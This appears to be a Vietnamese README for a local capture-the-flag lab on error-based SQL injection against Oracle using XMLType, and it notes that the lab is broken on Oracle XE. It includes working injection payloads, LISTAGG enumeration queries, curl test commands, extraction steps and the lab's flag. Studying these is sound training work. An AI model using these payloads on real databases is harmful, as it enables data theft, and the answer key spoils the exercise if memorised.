# SQLi-016: Oracle XMLType Error-based

> ⚠️ **LƯU Ý: LAB NÀY CÓ LỖI**
>
> XMLType trên **Oracle XE (Express Edition)** không leak data trong error messages do thiếu LPX message files.
>
> **Error nhận được:** `LPX-00210: Message 210 not found; No message file for product=XDK, facility=LPX`
>
> **Thay vì data được leak**, error chỉ hiển thị "Message not found".
>
> **Giải pháp thay thế:** Sử dụng [SQLi-015 (CTXSYS.DRITHSX.SN)](../SQLi-015/) - method này hoạt động tốt trên Oracle XE.

## 🎯 Mục Tiêu

Khai thác SQL Injection trên Oracle Database bằng kỹ thuật **Error-based** với hàm `XMLType`.

## 📝 Mô Tả

Ứng dụng Data Export cho phép export dữ liệu thông qua tham số `id`:

**URL:** `http://localhost:5016/export?id=1`

Ứng dụng sử dụng Oracle Database làm backend và có lỗ hổng SQL Injection. Database chứa 2 bảng:

- `exports`: Chứa các export data công khai (id, name, data)
- `secrets`: Chứa dữ liệu nhạy cảm (id, name, value) - **Đây là mục tiêu**

## 🎓 Kiến Thức Cần Biết

### XMLType là gì?

`XMLType` là một Oracle datatype constructor được sử dụng để tạo XML documents từ strings. Hàm này có 1 tham số:

```sql
XMLType(xml_string)
```

**Đặc điểm quan trọng:**

- Tham số `xml_string` **phải là valid XML**
- Khi truyền vào một non-XML string, Oracle cố parse và fail
- **Oracle hiển thị nội dung string trong error message**
- Có sẵn trên **tất cả Oracle versions** (kể cả XE)

### Tại sao dùng XMLType?

Trong các kỹ thuật Error-based SQLi trên Oracle, có nhiều hàm có thể khai thác:

| Hàm                 | Ưu điểm                                 | Nhược điểm                            |
| ------------------- | --------------------------------------- | ------------------------------------- |
| `XMLType`           | ✅ Có sẵn **mọi version**<br>✅ Dễ dùng | ❌ Output nhiều dòng hơn              |
| `CTXSYS.DRITHSX.SN` | ✅ Output sạch nhất                     | ❌ Yêu cầu Oracle Text                |
| `UTL_INADDR`        | ✅ Alternative tốt                      | ❌ Cần quyền cao<br>❌ Có thể bị chặn |

**Kết luận:** `XMLType` là lựa chọn tốt nhất khi:

- Oracle XE / Express Edition (không có Oracle Text)
- Cần compatibility cao nhất
- Không muốn phụ thuộc vào components bổ sung

### Cú pháp cơ bản

```sql
-- Lấy database user hiện tại
' AND 1=XMLType((SELECT user FROM dual))--

-- Lấy dữ liệu từ bảng bất kỳ
' AND 1=XMLType((SELECT column_name FROM table_name))--

-- Concatenate nhiều rows với LISTAGG
' AND 1=XMLType((SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
```

### LISTAGG - Kỹ thuật quan trọng

Khi subquery trả về nhiều rows, sử dụng `LISTAGG` để concatenate:

```sql
LISTAGG(column_name, delimiter) WITHIN GROUP (ORDER BY sort_column)
```

**Ví dụ:**

```sql
-- ❌ Lỗi: ORA-01427 (multiple rows)
SELECT table_name FROM user_tables

-- ✅ Đúng: Concat thành 1 string
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
-- Output: "EXPORTS,SECRETS"
```

### ❌ Payload phức tạp (tránh dùng)

```sql
-- Cố tạo XML tag - dễ lỗi và data bị mất
XMLTYPE('<:'||(SELECT user FROM dual)||'>')
-- Error: LPX-00240 (message file not found)
```

### ✅ Payload đơn giản (khuyến nghị)

```sql
-- Trực tiếp non-XML string
1 AND 1=XMLType((SELECT user FROM dual))--
-- Error rõ ràng: "expected '<' instead of 'A'\nAPP_USER"
```

## 🚀 Hướng Dẫn Triển Khai

### Khởi động lab

```bash
# Khởi động containers
docker-compose up -d

# Monitor database initialization (đợi 1-2 phút)
docker logs sqli-016-db-1 -f

# Kiểm tra web app
curl "http://localhost:5016/export?id=1"
```

### Test application

```bash
# Test basic SQLi detection
curl "http://localhost:5016/export?id=1'"
# Expect: ORA-01756 error

# Test XMLType method
curl "http://localhost:5016/export?id=1+AND+1=XMLType((SELECT+user+FROM+dual))--"
# Expect: APP_USER in error message
```

### Dừng lab

```bash
docker-compose down
```

## 💡 Gợi Ý

1. **Bước 1:** Kiểm tra ứng dụng có lỗ hổng SQLi không bằng cách test payload `id=1'`
2. **Bước 2:** Xác định database là Oracle từ error code `ORA-xxxxx`
3. **Bước 3:** Test XMLType với payload đơn giản
4. **Bước 4:** Enumerate database user, tables, columns
5. **Bước 5:** Sử dụng LISTAGG để xem nhiều rows cùng lúc
6. **Bước 6:** Extract flag từ bảng SECRETS

## 📚 Tài Liệu Tham Khảo

- [Complete Writeup](solution/writeup.md) - Chi tiết từng bước khai thác
- [Exploit Script](solution/exploit.py) - Automated exploitation
- [Oracle XMLType Documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/adxdb/XMLType-APIs.html)
- [Oracle SQLi Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

## 🏁 Flag Format

`FLAG{xmltyp3_0r4cl3_3xtr4ct}`
